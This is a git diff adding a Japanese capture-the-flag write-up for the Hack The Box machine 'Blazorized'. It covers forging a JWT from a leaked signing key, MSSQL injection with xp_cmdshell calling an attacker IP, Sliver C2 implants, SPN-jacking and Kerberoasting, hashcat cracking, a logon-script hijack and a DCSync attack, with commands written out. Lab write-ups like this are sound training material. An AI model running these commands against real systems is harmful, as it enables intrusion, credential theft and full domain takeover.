@@ -1,9 +1,4 @@
-# 概要
-
-
-
-| IP   | 10.10.11.22 |
-| :--- | ----------- |
+# Blazorized Writeup
 
 ![](screenshot/Blazorized.png)
 
@@ -217,10 +212,10 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Mon Jul  1 19:04:18 2024 -- 1 IP address (1 host up) scanned in 1325.39 seconds
 ```
 
-`blazorized.htb` というドメインを見つけたのでhostsファイルに追加
+`blazorized.htb` `dc1.blazorized.htb`というドメインを見つけたのでhostsファイルに追加
 
 ```
-10.10.11.22	blazorized.htb
+10.10.11.22	blazorized.htb dc1.blazorized.htb
 ```
 
 80番ポートが開いているのでサイトにアクセスしてみる
@@ -241,7 +236,273 @@ Blazor WebAssemblyを使用しているらしい
 
 ログインページが出てきたが認諸情報がないのでログインすることができない
 
+burp suiteを見てみると http://blazorized.htb で大量にdllが読み込まれていることが分かった。
 
+![](screenshot/image-20240715173207353.png)
 
+## JWT 認証
 
+http://blazorized.htb/_framework/blazor.boot.json にdllが大量に見つかった。
 
+![](screenshot/image-20240715173459964.png)
+
+blazorizedのdllが4つ見つかった。怪しそうなのでダウンロードしてdotpeekで逆コンパイルしてみる
+
+![](screenshot/image-20240715173837066.png)
+
+`Blazorized.Helpers.dll` を逆コンパイルするとJWTというクラスがあることが分かった。どうやらJWT(json web token)を作成するクラスらしく、tokenを作成するための以下の情報を得た
+
+![](screenshot/image-20240715174129390.png)
+
+```c#
+private const long EXPIRATION_DURATION_IN_SECONDS = 60;
+private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
+private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";
+private static readonly string postsPermissionsClaimValue = "Posts_Get_All";
+private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";
+private static readonly string superAdminRoleClaimValue = "Super_Admin";
+private static readonly string issuer = "http://api.blazorized.htb";
+private static readonly string apiAudience = "http://api.blazorized.htb";
+private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";
+```
+
+この情報を使ってtokenを作成して[JWT認証](https://qiita.com/asagohan2301/items/cef8bcb969fef9064a5c#3-jwt%E3%81%AE%E4%BD%9C%E3%82%8A%E6%96%B9)でadminページにアクセスできるかもしれない
+
+https://jwt.io/ でJWTを作成できるので使用する. 
+
+![](screenshot/image-20240715180939376.png)
+
+作成したjwtを開発者モードを開いてローカルストレージにロードする
+
+![](screenshot/image-20240715181048138.png)
+
+ページをリロードすると管理者ページにアクセスできた
+
+# MSSQL Injection
+
+![](screenshot/image-20240715181225112.png)
+
+写真の通りこのページはAPIを使用せずに直接データベースを操作することができるらしい。SQL Injectionが使えそう
+
+Windowsマシンであることが分かっているのでデータベースはMSSQLを使用していると考えられる
+
+カテゴリー名が重複しているか確認する機能があった。ここでデータベースに問い合わせをしているっぽい
+
+![](screenshot/image-20240715181632673.png)
+
+試しに条件が常に真となるように文を追加する
+
+![](screenshot/image-20240715182228495.png)
+
+SQL Injection が機能することが分かった。
+
+MSSQL にはコマンドを実行できる `xp_cmdshell` という機能があるのでこれでリバースシェルをとる
+
+[HackTricks 1433 - Pentesting MSSQL - Microsoft SQL Server Execute OS Commands](https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
+
+HackTricksにあった以下のペイロードでためす
+
+```mssql
+EXEC master..xp_cmdshell 'ping -c 3 10.10.16.16'
+```
+
+ping を打ってtcpdumpでパケットをキャプチャで切るか試したができなかった。
+
+そのままpowershellのりバースシェルを試してみた
+
+![](screenshot/image-20240715184055455.png)
+
+`nu_1055` としてシェルを取得できた
+
+![](screenshot/image-20240715185022159.png)
+
+user.txt ゲット
+
+# nu_1055
+
+`C:\Users` にて複数のユーザーが存在していることが分かった。 `RSA_4810`, `SSA_6010` に横移動する必要がありそう
+
+![](screenshot/image-20240715191310404.png)
+
+これから横移動などをしやすくするためC2セッションを確立し、いろいろと融通が利くようにする
+
+Sliver C2 を使用する
+
+![](screenshot/image-20240806152325054.png)
+
+インプラントを作成
+
+![](screenshot/image-20240806152409351.png)
+
+作成したペイロードをダウンロード
+
+![](screenshot/image-20240806152752416.png)
+
+Sliverでリスナーを起動する
+
+![](screenshot/image-20240806152907302.png)
+
+インプラントを実行
+
+![](screenshot/image-20240806153139436.png)
+
+C2 セッションを確立することができた
+
+![](screenshot/image-20240806153034738.png)
+
+## BloodHound
+
+BloodHoundでの列挙をしたいので `SharpHound.exe` をアップロードして実行する
+
+![](screenshot/image-20240806153301187.png)
+
+![](screenshot/image-20240806154056513.png)
+
+作成されたzipファイルをダウンロードしてBloodHoundにアップロードする
+
+![](screenshot/image-20240806154242796.png)
+
+ユーザー `NU_1055` が ユーザー `RSA_4810` に対して `WriteSPN` の権限を持っていることが分かった。
+
+この権限を悪用することで対象のサービスアカウントの認諸情報を盗むことができるSPN-jackingを行える
+
+![](screenshot/image-20240715191808409.png)
+
+## SPN-jacking
+
+PowerView.ps1 をアップロードして読みこませておく
+
+![](screenshot/image-20240806154936844.png)
+
+![](screenshot/image-20240715192928031.png)
+
+SPNをRSA_4810に追加
+
+```
+Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='spn/spn-jacking'}
+Get-SPNTicket -SPN spn/spn-jacking
+```
+
+SliverにはRubeusを実行できるパッケージがあるのでそれを使用してkerberosting攻撃を実行
+
+```
+rubeus kerberoast 
+```
+
+チケットを取得することができた
+
+![](screenshot/image-20240806155909684.png)
+
+チケットをファイルに保存することもできる
+
+![](screenshot/image-20240806160020517.png)
+
+![](screenshot/image-20240715201829088.png)
+
+`Get-DomainSPNTicket` を使用して取得することもできる
+
+```powershell
+$ticket = Get-DomainSPNTicket -SPN spn/spn-jacking
+$ticket.Hash # ハッシュのみ
+$ticket | Format-List -Property SamAccountName, DistinguishedName, ServicePrincipalName, Hash # すべて出力
+```
+
+```powershell
+Get-DomainSPNTicket -SPN spn/spn-jacking | Select-Object -ExpandProperty Hash
+```
+
+![](screenshot/image-20240715202428692.png)
+
+チケットをファイルに保存してhashcatで解析する
+
+```
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+![](screenshot/image-20240715203017208.png)
+
+解析に成功し、パスワードを取得した
+
+```
+(Ni7856Do9854Ki05Ng0005 #)
+```
+
+取得したパスワードを使用して `evil-winrm` でログインする
+
+![](screenshot/image-20240715203549271.png)
+
+RSA_4810に横移動することができた
+
+# RSA_4810
+
+RSA_4810に横移動することができたのでもう一つのユーザー `SSA_6010` を次の目標にする
+
+BloodHoundでRSA_4810について調べてみたが使えそうな情報は見つからなかった。
+
+RSA_4810が持っているACLを検索する
+
+```
+Find-InterestingDomainAcl -ResolveGUIDs | ?{ $_.IdentityReferenceName -match "RSA_4810"}
+```
+
+![](screenshot/image-20240715223836507.png)
+
+RSA_4810はSSA_6010のスクリプトパスを変更できることが分かった。
+
+`Get-NetUser` で `SSA_6010` について調べる
+
+![](screenshot/image-20240806144637716.png)
+
+`3073`回ログオンしていることが分かった
+
+![](screenshot/image-20240806144822286.png)
+
+もう一度実行するとログオン回数が増加いていることが分かる。どうやら定期的にSSA_6010はログオンしていることが分かる。
+
+ユーザーのログオンスクリプトがおかれている `C:\Windows\SYSVOL\sysvol\blazorized.htb\script\A32FF3AEAA23` に
+
+カスタムバッチスクリプトを作成する。
+
+![](screenshot/image-20240806150232289.png)
+
+作成したスクリプトをスクリプトパスに追加する
+
+```powershell
+Set-ADUser -Identity SSA_6010 -ScriptPath "A32FF3AEAA23\login.bat"
+```
+
+リスナーを起動してしばらく待つと `SSA_6010` のシェルを取得することができた。
+
+![](screenshot/image-20240806151226069.png)
+
+# Administrator
+
+あたらしいインプラントを作成する
+
+![](screenshot/image-20240806160315160.png)
+
+インプラントをダウンロードして実行
+
+![](screenshot/image-20240806160548440.png)
+
+![](screenshot/image-20240806160622862.png)
+
+## DCSync攻撃
+
+`SSA_6010` にはドメインに対するDCSyncの権限をもっている
+
+![](screenshot/image-20240715221749419.png)
+
+SliverのMimikatzパッケージをを使用してDCSync攻撃を実行する
+
+![](screenshot/image-20240806162048061.png)
+
+DCSync攻撃の実行に成功し `Administrator` の NTLM Hashを取得した
+
+![](screenshot/image-20240806162307287.png)
+
+取得したハッシュ値を使用してevil-winrmでログインすることができた
+
+![](screenshot/image-20240806162536405.png)
+
+root.txtを取得
